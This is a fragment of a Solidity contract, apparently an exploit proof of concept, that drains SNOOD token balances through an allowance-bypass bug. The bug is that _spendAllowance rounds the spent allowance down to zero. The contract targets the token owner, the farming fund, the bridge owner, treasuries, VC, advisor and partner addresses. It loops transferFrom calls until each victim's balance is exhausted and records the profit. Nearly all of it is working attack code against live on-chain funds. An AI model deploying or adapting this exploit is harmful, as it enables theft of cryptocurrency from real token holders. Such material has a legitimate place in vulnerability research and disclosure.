    address private constant ADVISOR_3 = 0x587E1eB15a2E98B575f8f4925310684111Be9812;
    address private constant PARTNER = 0x6D257D2dB115947dc0C75d285B4396a03C577E2E;

    uint256 private constant MAX_DUST_ALLOWANCE = 1;
    uint256 private constant MAX_ATTEMPTS_PER_VICTIM = 64;

    uint256 private _startingBalance;
    uint256 private _profitAmount;
    bool private _initialized;

    address public lastVictim;
    uint256 public lastObservedAllowance;
    uint256 public lastObservedBalance;
    uint256 public lastAllowanceAfterTransfer;
    uint256 public lastTransferredAmount;
    bool public lastAllowanceBypassConfirmed;

    constructor() {}

    function executeOnOpportunity() external {
        if (!_initialized) {
            _initialized = true;
            _startingBalance = _balanceOf(address(this));
        }

        address attacker = address(this);

        // No flashloan or auxiliary funding is needed for this finding.
        // The exploit is a direct `transferFrom` allowance-bypass against live SNOOD balances.
        _drainVictim(_safeOwner(), attacker);
        _drainVictim(_safeFarmingFund(), attacker);
        _drainVictim(_safeBridgeOwner(), attacker);

        _drainVictim(CURRENT_TREASURY, attacker);
        _drainVictim(OLD_TREASURY, attacker);
        _drainVictim(VC_1, attacker);
        _drainVictim(VC_2, attacker);
        _drainVictim(ADVISOR_1, attacker);
        _drainVictim(ADVISOR_2, attacker);
        _drainVictim(ADVISOR_3, attacker);
        _drainVictim(PARTNER, attacker);

        uint256 endingBalance = _balanceOf(attacker);
        _profitAmount = endingBalance > _startingBalance ? endingBalance - _startingBalance : 0;
    }

    function profitToken() external pure returns (address) {
        return address(TOKEN);
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _safeOwner() internal view returns (address candidate) {
        try TOKEN.owner() returns (address account) {
            candidate = account;
        } catch {}
    }

    function _safeFarmingFund() internal view returns (address candidate) {
        try TOKEN.getFarmingFund() returns (address account) {
            candidate = account;
        } catch {}
    }

    function _safeBridgeOwner() internal view returns (address candidate) {
        try TOKEN.getBridgeOwner() returns (address account) {
            candidate = account;
        } catch {}
    }

    function _drainVictim(address victim, address attacker) internal {
        if (victim == address(0) || victim == attacker || victim == address(TOKEN)) {
            return;
        }

        uint256 victimBalance = _balanceOf(victim);
        if (victimBalance == 0) {
            return;
        }

        uint256 allowanceBefore = _allowance(victim, attacker);
        if (allowanceBefore > MAX_DUST_ALLOWANCE) {
            return;
        }

        lastVictim = victim;
        lastObservedAllowance = allowanceBefore;
        lastObservedBalance = victimBalance;
        lastAllowanceAfterTransfer = allowanceBefore;
        lastTransferredAmount = 0;
        lastAllowanceBypassConfirmed = false;

        // exploit_paths[0]: victim already holds live on-chain SNOOD and may have given the
        // attacker no approval at all, or only a tiny dust approval.
        // exploit_paths[1]: the attacker calls `transferFrom(victim, attacker, amount)` with a
        // practical token amount taken from the victim's observed balance.
        // exploit_paths[2]: inside the vulnerable token, `_spendAllowance()` incorrectly applies
        // `_getStandardAmount()` to the already-standard `amount`, so the spent allowance rounds
        // down to `0`; the allowance check therefore passes unchanged while `transferFrom()` still
        // reaches `_send()` and moves the requested tokens.
        // exploit_paths[3]: repeat the same `transferFrom(victim, attacker, amount)` pattern until
        // the victim's transferable balance is exhausted.

        uint256 nextAmount = victimBalance;
        uint256 attempts;
        uint256 trackedAllowance = allowanceBefore;

        while (nextAmount > 0 && attempts < MAX_ATTEMPTS_PER_VICTIM) {
            attempts++;

            bool ok;
            try TOKEN.transferFrom(victim, attacker, nextAmount) returns (bool success) {
                ok = success;
            } catch {
                ok = false;
            }

            if (!ok) {
                nextAmount >>= 1;
                continue;
            }

            uint256 allowanceAfter = _allowance(victim, attacker);
            uint256 remainingBalance = _balanceOf(victim);

            lastTransferredAmount = nextAmount;
            lastAllowanceAfterTransfer = allowanceAfter;

            if (allowanceAfter != trackedAllowance) {
                return;
            }

            lastAllowanceBypassConfirmed = true;
            lastObservedBalance = remainingBalance;

            if (remainingBalance == 0) {
                return;
            }

            nextAmount = remainingBalance;
        }
    }

    function _balanceOf(address account) internal view returns (uint256 amount) {
        try TOKEN.balanceOf(account) returns (uint256 observedBalance) {
            amount = observedBalance;
        } catch {}
    }

    function _allowance(address owner, address spender) internal view returns (uint256 amount) {
        try TOKEN.allowance(owner, spender) returns (uint256 approvedAmount) {
            amount = approvedAmount;
        } catch {}
    }
}
